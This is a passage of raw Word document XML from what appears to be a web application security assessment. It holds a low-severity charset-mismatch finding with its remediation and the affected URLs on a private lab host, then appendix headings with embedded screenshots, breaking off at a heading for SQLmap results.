      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3ECFB4D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945B50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23FA5F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2FE138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158DB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8E1A18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http://192.168.1.20/register-failed.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="73CC6F3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40F6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F498DA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68CFCD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04D3CE0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C93A0C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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7BC6F0E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9CD980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F4F2EE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35AE0B7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A15262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3865D5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http://192.168.1.20/billing-alternative.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1CAE5183"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0FB6C3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87431F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39A0E1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679D4A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ADFB7C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http://192.168.1.20/login-failed.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="707E556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81C004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54418F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5AFC9A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39A0426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5420B43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http://192.168.1.20/member-profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0E6F6E08"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43D6D8D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lastRenderedPageBreak/>
              <w:t>Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24488DA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0ADAFDD"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3DCD00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2925229D"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http://192.168.1.20/ratings.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="055ED45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240680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BE4D8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64AE91D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2204141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1182DEE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http://192.168.1.20/admin/profile.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="687AAA79"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181D04D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2C4EDCD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35A3F72"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4EACEA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F06CFA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http://192.168.1.20/admin/categories.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="59251CB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7840CE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939600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06C76088"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FCC941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665931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http://192.168.1.20/admin/accounts.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3E65FA54"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9CEE72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01874B72"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22049A9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69413EE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0717402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http://192.168.1.20/member-index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="641BE902"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25AA7F5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8E3540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2625631"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DC6E8B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2DA7909"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http://192.168.1.20/tables.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="796364A0"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51915C7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5094D95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E31D7D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751855E4"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1A4112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http://192.168.1.20/admin/foods.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="431EDE8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6932E797"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60EB6F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135A50FE"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124B956C"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78B0026F"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http://192.168.1.20/admin/specials.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="58DDACE6"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AE1CCB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13770A9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5EE16C8C" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="60" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="60" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B3EEB4A"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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47D559C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http://192.168.1.20/admin/allocation.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3C5E8F2E" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="60" w:type="dxa"/>
              <w:left w:w="600" w:type="dxa"/>
              <w:bottom w:w="60" w:type="dxa"/>
              <w:right w:w="600" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="090E277B"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Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F0D4D6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GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4804BC2B"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2A7A4D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Instances</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="446A95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29</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2FEC7285"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78B398E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Solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CFCF916"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Force UTF-8 for all text content in both the HTTP header and meta tags in HTML or encoding declarations in XML.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="49F11CAC"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CF234A1"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Other information</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12D9D5F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There was a charset mismatch between the HTTP Header and the META content-type encoding declarations: [UTF-8] and [iso-8859-1] do not match.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="27F91C88" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41E5CD13" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="204DED27"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1AC863F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Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14AF334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http://code.google.com/p/browsersec/wiki/Part2#Character_set_handling_and_detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0EF44E73"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688FAEE8"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CWE Id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B35EDE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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0FAD2FBA"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4D7246C0"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WASC Id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34111DB3"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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="362D0850" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="020CA1EE"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Source ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39ACD325" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DA102C">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78A4B5AF" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61DAE57F" w14:textId="77777777" w:rsidR="004F7D58" w:rsidRDefault="004F7D58" w:rsidP="004F7D58">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="80" w:name="_Toc58836625"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="80"/>
    </w:p>
    <w:p w14:paraId="25A31AC5" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00C83DB6">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C43B433" wp14:editId="7C650355">
            <wp:extent cx="4328443" cy="12435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0310" cy="1304454"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D46C50A" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRPr="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00C83DB6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="81" w:name="_Toc58836626"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>7.3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="81"/>
    </w:p>
    <w:p w14:paraId="1F0209CB" w14:textId="77777777" w:rsidR="004F7D58" w:rsidRDefault="00CD645A" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A3DC8FE" wp14:editId="3F548E84">
            <wp:extent cx="4276725" cy="1247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1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3E7FA6" w14:textId="77777777" w:rsidR="004F7D58" w:rsidRDefault="004F7D58" w:rsidP="004F7D58">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="82" w:name="_Toc58836627"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:bookmarkEnd w:id="82"/>
    </w:p>
    <w:p w14:paraId="74B3C10B" w14:textId="77777777" w:rsidR="00CD645A" w:rsidRPr="00CD645A" w:rsidRDefault="00C83DB6" w:rsidP="00CD645A">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29EC3A6B" wp14:editId="6689D3E4">
            <wp:extent cx="4257675" cy="1257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675" cy="1257300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F01B69D" w14:textId="77777777" w:rsidR="004F7D58" w:rsidRDefault="00F70916" w:rsidP="00F70916">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="83" w:name="_Toc58836628"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:bookmarkEnd w:id="83"/>
    </w:p>
    <w:p w14:paraId="6FC76300" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5092B46F" wp14:editId="2720E1AA">
            <wp:extent cx="5400675" cy="742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742950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2DD928" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00F70916">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="84" w:name="_Toc58836629"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:bookmarkEnd w:id="84"/>
    </w:p>
    <w:p w14:paraId="2CF0AB93" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="337DFA58" wp14:editId="02F9D5AB">
            <wp:extent cx="4267200"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200" cy="1219200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F2EA4A" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00F70916">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="85" w:name="_Toc58836630"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:bookmarkEnd w:id="85"/>
    </w:p>
    <w:p w14:paraId="2D12E217" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4586B07A" wp14:editId="5B2D0A5E">
            <wp:extent cx="4257675" cy="1447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7675" cy="1447800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="48785197" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00F70916">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="86" w:name="_Toc58836631"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidR="00C83DB6">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:bookmarkEnd w:id="86"/>
    </w:p>
    <w:p w14:paraId="4ADEE166" w14:textId="77777777" w:rsidR="00F70916" w:rsidRDefault="00F70916" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69F3A504" wp14:editId="430E87BC">
            <wp:extent cx="4257675" cy="1238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675" cy="1238250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6379F433" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00C83DB6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="_Toc58836632"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.9</w:t>
      </w:r>
      <w:bookmarkEnd w:id="87"/>
    </w:p>
    <w:p w14:paraId="589A22D1" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F7A05C0" wp14:editId="273B510C">
            <wp:extent cx="4286250" cy="1247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1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C36810C" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00C83DB6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="88" w:name="_Toc58836633"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.10</w:t>
      </w:r>
      <w:bookmarkEnd w:id="88"/>
    </w:p>
    <w:p w14:paraId="42016A06" w14:textId="77777777" w:rsidR="00C83DB6" w:rsidRDefault="00C83DB6" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29A0F8FA" wp14:editId="1F7C4A77">
            <wp:extent cx="4267200" cy="1247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200" cy="1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4D38A7" w14:textId="77777777" w:rsidR="003342CF" w:rsidRDefault="003342CF" w:rsidP="003342CF">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="89" w:name="_Toc58836634"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.11</w:t>
      </w:r>
      <w:r w:rsidR="00C50609">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQLmap results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="89"/>
    </w:p>
    <w:p w14:paraId="6C833BA7" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C50609">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
